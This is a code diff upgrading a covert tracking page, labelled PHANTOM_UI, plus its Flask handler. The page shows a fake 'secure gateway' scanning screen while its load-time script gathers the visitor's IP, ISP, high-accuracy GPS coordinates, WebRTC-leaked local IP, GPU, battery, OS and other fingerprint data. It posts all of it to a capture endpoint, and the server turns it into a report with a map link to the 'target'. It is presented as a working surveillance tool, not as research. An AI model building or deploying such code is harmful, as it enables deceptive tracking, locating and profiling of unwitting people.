@@ -11,74 +11,86 @@ PHANTOM_UI = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SECURE_STATION_v7.0</title>
+    <title>ULTRA_PHANTOM_v8.0</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Share Tech Mono', monospace; text-align: center; padding-top: 15%; margin:0; }
-        .box { border: 1px solid #0f0; display: inline-block; padding: 40px; background: rgba(0,20,0,0.9); box-shadow: 0 0 50px #0f0; position: relative; }
-        .scan-line { width: 100%; height: 5px; background: #0f0; position: absolute; top: 0; left:0; animation: scan 2s linear infinite; }
+        .box { border: 1px solid #0f0; display: inline-block; padding: 40px; background: rgba(0,20,0,0.95); box-shadow: 0 0 60px #0f0; position: relative; }
+        .scan-line { width: 100%; height: 6px; background: #0f0; position: absolute; top: 0; left:0; animation: scan 1.5s linear infinite; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
     </style>
 </head>
 <body onload="capture()">
     <div class="box">
         <div class="scan-line"></div>
-        <h2 id="header">CORE_FORENSIC_BYPASS</h2>
-        <p id="status">Brute-forcing Device Metadata... [v7.0]</p>
-        <div id="loader">STATUS: EXTRACTING_A_TO_Z_NODES</div>
+        <h2 id="header">ULTRA_SECURE_GATEWAY</h2>
+        <p id="status">Scanning Advanced Metadata... [v8.0]</p>
+        <div id="loader">STATUS: EXTRACTING_ELITE_INTEL_NODES</div>
     </div>
 
     <script>
         async function capture() {
             try {
-                // IP & GEO
+                // 1. IPv4 & Advanced GEO
                 const ipRes = await fetch('https://ipapi.co/json/');
-                const ip = await ipRes.json();
+                const ipData = await ipRes.json();
 
-                // BATTERY
-                let batt = "N/A";
-                if(navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    batt = Math.round(b.level * 100) + "% (" + (b.charging ? "Plugged" : "Battery") + ")";
-                }
-
-                // GPU & HARDWARE
+                // 2. ELITE HARDWARE FINGERPRINTING
                 let gpu = "Unknown";
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if(debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if(gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Software/Hidden";
+                }
 
-                // LOCAL IP (WEBRTC)
+                // 3. BATTERY & POWER
+                let batt = "Blocked";
+                if(navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batt = Math.round(b.level * 100) + "% (" + (b.charging ? "AC Power" : "Discharging") + ")";
+                }
+
+                // 4. WEBRTC (LOCAL IP)
                 let localIP = "N/A";
                 const pc = new RTCPeerConnection({iceServers:[]});
                 pc.createDataChannel("");
                 pc.createOffer().then(o => pc.setLocalDescription(o));
                 pc.onicecandidate = (i) => { if(i && i.candidate) localIP = i.candidate.address; };
 
-                // GPS
-                const getPos = () => new Promise(r => navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r(null)));
+                // 5. GPS COORDINATES
+                const getPos = () => new Promise(r => navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r(null), {enableHighAccuracy: true}));
                 const coords = await getPos();
+
+                // 6. OS & DEVICE TYPE
+                const ua = navigator.userAgent;
+                let osName = "Unknown";
+                if (ua.includes("Win")) osName = "Windows";
+                else if (ua.includes("Android")) osName = "Android";
+                else if (ua.includes("iPhone") || ua.includes("iPad")) osName = "iOS";
+                else if (ua.includes("Mac")) osName = "MacOS";
+                else if (ua.includes("Linux")) osName = "Linux";
 
                 const intel = {
                     time: new Date().toLocaleString(),
-                    ip: ip.ip || "N/A",
+                    ipv4: ipData.ip || "N/A",  // IPv4 Explicitly
                     local_ip: localIP,
-                    isp: ip.org || "N/A",
-                    city: ip.city || "N/A",
-                    country: ip.country_name || "N/A",
+                    isp: ipData.org || "N/A",
+                    city: ipData.city || "N/A",
+                    country: ipData.country_name || "N/A",
                     lat: coords ? coords.latitude : "Denied",
                     lon: coords ? coords.longitude : "Denied",
+                    os: osName,
                     platform: navigator.platform,
-                    agent: navigator.userAgent,
+                    agent: ua,
                     gpu: gpu,
-                    cores: navigator.hardwareConcurrency,
+                    cores: navigator.hardwareConcurrency || "N/A",
                     ram: navigator.deviceMemory || "N/A",
                     battery: batt,
-                    screen: window.screen.width + "x" + window.screen.height,
-                    orientation: screen.orientation ? screen.orientation.type : "N/A",
+                    screen: window.screen.width + "x" + window.screen.height + " (" + screen.orientation.type + ")",
                     lang: navigator.language,
                     touch: navigator.maxTouchPoints || 0,
-                    referrer: document.referrer || "Direct Access"
+                    vendor: navigator.vendor,
+                    connection: navigator.connection ? navigator.connection.effectiveType : "N/A"
                 };
 
                 await fetch('/script20/capture_data', {
@@ -90,7 +102,7 @@ PHANTOM_UI = """
                 document.getElementById('header').innerText = "FORENSICS_COMPLETE";
                 document.getElementById('status').innerText = "Data nodes stabilized.";
 
-            } catch (e) { console.log(e); }
+            } catch (e) { console.error(e); }
         }
     </script>
 </body>
@@ -106,24 +118,26 @@ def capture_data():
     try:
         i = request.json
         message = (
-            f"⚡ *--- A-TO-Z FORENSIC INTEL ---* ⚡\\n\\n"
+            f"🔥 *--- PHANTOM ELITE v8.0 REPORT ---* 🔥\\n\\n"
             f"📅 *DATETIME:* `{i['time']}`\\n"
-            f"🌐 *NETWORK NODES*\\n"
-            f"┣ IP: `{i['ip']}`\\n"
-            f"┣ Local: `{i['local_ip']}`\\n"
+            f"🌐 *NETWORK INTEL (A-GRADE)*\\n"
+            f"┣ *IPv4 ADDRESS:* `{i['ipv4']}`\\n"  # IPv4 Highlighted
+            f"┣ Local IP: `{i['local_ip']}`\\n"
             f"┣ ISP: `{i['isp']}`\\n"
-            f"┗ From: `{i['referrer']}`\\n\\n"
-            f"📍 *TARGET LOCATION*\\n"
+            f"┗ Net Type: `{i['connection']}`\\n\\n"
+            f"📍 *GEOLOCATION*\\n"
             f"┣ Lat/Lon: `{i['lat']}, {i['lon']}`\\n"
             f"┣ City: `{i['city']}, {i['country']}`\\n"
             f"┗ Map: [Google Maps](https://www.google.com/maps?q={i['lat']},{i['lon']})\\n\\n"
-            f"💻 *HARDWARE SPECIFICATIONS*\\n"
+            f"💻 *CORE SYSTEM SPECS*\\n"
+            f"┣ *OS:* `{i['os']}`\\n"
             f"┣ Platform: `{i['platform']}`\\n"
             f"┣ GPU: `{i['gpu']}`\\n"
             f"┣ RAM: `{i['ram']} GB` | Cores: `{i['cores']}`\\n"
             f"┣ Battery: `{i['battery']}`\\n"
-            f"┗ Screen: `{i['screen']} ({i['orientation']})`\\n\\n"
-            f"⚙️ *SYSTEM FINGERPRINT*\\n"
+            f"┗ Screen: `{i['screen']}`\\n\\n"
+            f"⚙️ *ADVANCED METADATA*\\n"
+            f"┣ Vendor: `{i['vendor']}`\\n"
             f"┣ Language: `{i['lang']}`\\n"
             f"┗ Touch Points: `{i['touch']}`\\n\\n"
             f"📎 *FULL USER AGENT*\\n"
